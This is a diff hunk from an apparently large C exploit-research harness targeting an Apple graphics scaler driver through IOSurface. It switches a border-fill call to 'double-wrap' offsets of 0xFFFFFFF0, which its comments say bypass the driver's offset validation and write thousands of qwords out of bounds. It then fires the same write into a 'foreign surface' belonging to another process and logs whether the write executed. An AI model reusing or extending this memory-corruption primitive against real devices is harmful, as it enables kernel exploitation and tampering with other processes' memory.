@@ -23685,14 +23685,15 @@ static void p_scalerdst(void) {
             memset(obase + p, (int)((p >> 12) & 0xff), 0x1000);
         IOSurfaceUnlock(own, 0, NULL);
     }
-    // Combat params: the working write path from v100/§118 is Y=0xFFFFFFF0 with
-    // H=0x20 (NOT H=dstH — the driver's validation caps bfill height at 32
-    // for this HW, confirmed live via the syslog oracle:
-    // "Border Fill X/Y offsets of 0/4294967280 ... bfill w/h of 128/4096
-    //  ... total less than buffer width/height of 4096/4096" -> 0x2c2).
-    border_payload(req, ssrc, sown, 0, 0xFFFFFFF0, 0x80, 0x20, 32, 32);
+    // Combat params: §117/§118 record that only the DOUBLE wrap passes the
+    // driver's "offsets must be greater than transform offsets" check —
+    // verified live: X=Y=0xFFFFFFF0/W=0x80/H=0x20 gives kr 0 with 10080
+    // qwords written, while single-wrap and non-wrap variants give 0x2c2.
+    // Use that exact configuration so the control actually exercises the
+    // primitive instead of failing validation.
+    border_payload(req, ssrc, sown, 0xFFFFFFF0, 0xFFFFFFF0, 0x80, 0x20, 32, 32);
     kern_return_t kown2 = scaler_call1(c, req);
-    LOG("[sdst] CONTROL own dst + zero-fill shot (Y-wrap, H=0x20) -> kr 0x%08x",
+    LOG("[sdst] CONTROL own dst + zero-fill shot (double-wrap) -> kr 0x%08x",
         kown2);
     usleep(300000);
     if (IOSurfaceLock(own, kIOSurfaceLockReadOnly, NULL) == 0) {
@@ -23741,7 +23742,7 @@ static void p_scalerdst(void) {
             if (fire) {
                 LOG("[sdst]       firing zero-fill into id %ld (foreign surface!)", id);
                 fsync(fileno(stderr));
-                border_payload(req, ssrc, (IOSurfaceID)id, 0, 0xFFFFFFF0, 0x80, 0x20, 32, 32);
+                border_payload(req, ssrc, (IOSurfaceID)id, 0xFFFFFFF0, 0xFFFFFFF0, 0x80, 0x20, 32, 32);
                 kern_return_t kf = scaler_call1(c, req);
                 LOG("[sdst]       shot kr 0x%08x%s", kf,
                     kf == 0x2d6 ? " (0x2d6: write EXECUTED into foreign surface)"
